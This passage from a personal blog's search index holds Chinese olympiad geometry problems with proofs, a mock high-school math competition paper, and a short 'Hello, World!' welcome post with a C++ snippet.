$AB=AC$. 设$X, Y$分别在边$BC, CA$上, 且$XY//AB$. 记$\triangle CXY$的外心为$D$, $BY$的中点为$E$. 求证:$\angle AED=90^\circ.$</p><p><strong>解析 </strong> 过$B$作$BF//AY$, 交$YX$的延长线于$F$.</p><p>由$BF//AY,AB//XY$知四边形$ABFY$为平行四边形.</p><p>由$E$为$BY$的中点,得$E$为$AF$的中点.</p><p>由$AB=AC$,有$\angle ABC = \angle ACB$,于是$\angle YXC=\angle ABC$,从而$YX=YC$.</p><p>连接$FD, DC, DA, DY$,则$\angle FYD = \angle CYD$.</p><p>由$AC=YF,DY=DC,\angle DCA=\angle DYF$,知$\triangle ADC\cong\triangle FDY$.</p><p>有$DA=DF$,而$E$为$AF$的中点,则$DE\bot AF$,即$\angle AED=90^\circ$.</p><p><img src="/pic/01.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/2022/09/02/ji-he-yi-kui-09-02/"/>
      <url>/2022/09/02/ji-he-yi-kui-09-02/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>在$\triangle ABC$中, $\angle BAC$的平分线与$\triangle ABC$的外接圆的另一交点为$D$, $M$是$BC$的中点, $P$是过点$M$且垂直于$AD$的直线上一点, 过点$P$且垂直于$PD$的直线与直线$AB, AC$分别交于$E, F$. 求证: $P$是$EF$的中点.</p><p><strong>Proof:</strong></p><p>由点$D$向边$AB, AC$作垂线, 垂足分别为$G, H$. 连接$DE, DF$.</p><p>因为点$D$在$\triangle ABC$的外接圆上, 且$DG\perp AB, DH\perp AC, DM\perp BC$， </p><p>故由$Simson$定理, 知$G, H, M$三点共线. </p><p>又因$AD$平分$\angle BAC$， 故$DG=DH$, 且$GH\perp AD$, 结合$MP\perp AD$，</p><p>知$G, H, M, P$四点共线.</p><p>那么由$\angle DPE=\angle DGE=90^\circ$, 知$P, D, E, G$四点共圆,</p><p>同理知$P, D, F, H$四点共圆.</p><p>那么</p><script type="math/tex; mode=display">\angle DEG=\angle DPG=\angle DFH, \mbox{结合}DG=DH,</script><p>知</p><script type="math/tex; mode=display">\triangle DEG \cong\triangle DFH,</script><p>那么$DE=DF$. 又$DP\perp EF$, 故$P$为线段$EF$中点.</p><p><img src="/pic/04.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高联一试模拟试题</title>
      <link href="/2022/08/29/gao-lian-yi-shi-mo-ni-shi-ti/"/>
      <url>/2022/08/29/gao-lian-yi-shi-mo-ni-shi-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="全国高中数学联合竞赛一试模拟试题"><a href="#全国高中数学联合竞赛一试模拟试题" class="headerlink" title="全国高中数学联合竞赛一试模拟试题"></a>全国高中数学联合竞赛一试模拟试题</h1><h4 id="一、填空题"><a href="#一、填空题" class="headerlink" title="一、填空题"></a><strong>一、填空题</strong></h4><p><strong>1. </strong> 若点$P(x, y)$在直线$x+3y-3=0$上移动, 则函数$f(x, y)=3^x+9^y$的最小值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>2. </strong> 已知方程$x^2+(4+i)x+4+ai=0 ($其中$a\in\mathbb{R})$有实根$b$, 且$z=a+b i$, 那么复数$z=\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>3. </strong> 若实数$x, y$满足$\tan x=x, \tan y=y$, 且$|x|\ne |y|$, 则$\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>4. </strong> $\sum_{k=1}^{2022} \left[\sqrt[4]{\frac{2022}{k}}\right]$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>5. </strong> 在数列${\left\{a_n\right\}}$中, $a_n=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})}$, 则数列$\left\{ a_n \right\}$前2022项的和为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>6. </strong> 过四面体$ABCD$的顶点$D$作半径为1的球, 该球与四面体$ABCD$的外接球切于点$D$, 且与面$ABC$相切. </p><p>若$AD=2\sqrt{3}, \angle BAD=\angle CAD=45^\circ, \angle BAC=60^\circ$, 则四面体的外接球半径$r$为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>7. </strong> 已知双曲线$\frac{x^2}{a^2}-\frac{y^2}{b^2}=1$的左顶点为$A$, 右焦点为$F$. 设$P$为第一象限中双曲线上的任意一点, 若总有$\angle PFA=2\angle FAP$, 则双曲线的离心率为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>8. </strong> 正整数集合$A_k$的最小元素为1, 最大元素为2022, 并且各元素可以从小到大排成一个公差为$k$的等差数列, 则并集$A_{43}\cup A_{47}$中的元素个数为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><h4 id="二、解答题"><a href="#二、解答题" class="headerlink" title="二、解答题"></a><strong>二、解答题</strong></h4><p><strong>9. </strong> 已知实数$x, y$都在区间$(-2, 2)$内, 且$xy=-1$, 常数$a\in (2, 8)$, 求函数$f(x, y)=\frac{4}{4-x^2}+\frac{a^2}{a^2-y^2}$的最小值.</p><p><strong>10. </strong> 椭圆$C:\frac{x^2}{a^2}+\frac{y^2}{b^2}=1(a&gt;b&gt;0)$的左、右焦点分别为$F_1$、$F_2$, 右顶点为$A$, $P$为椭圆上任意一点, 已知$\overrightarrow{PF_1} \cdot \overrightarrow{PF_2}$的最大值为3, 最小值为2.</p><p>(1)求椭圆$C$的方程.</p><p>(2)若直线$l:y=kx+m$与椭圆$C$相交于$M, N$两点$(M, N$不是左、右顶点$)$, 且以$MN$为直径的圆过点A, 求证: 直线$l$过顶点, 并求出该定点的坐标.</p><p><strong>11. </strong> 在等腰$\triangle ABC$中, $AB=AC$. 设$X, Y$分别在边$BC, CA$上, 且$XY//AB$. 记$\triangle CXY$的外心为$D$, $BY$的中点为$E$. 求证:$\angle AED=90^\circ.$</p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello, World!</title>
      <link href="/2022/08/26/hello-world/"/>
      <url>/2022/08/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://chengsx21.github.io/">Endeavor</a>!   </p><p>This is my very first post.   </p><p>If you get any problems when using this site, you can always ask me on <a href="https://github.com/chengsx21/chengsx21.github.io/issues">GitHub</a>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello world!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Welcome to Endeavor!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Programming </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
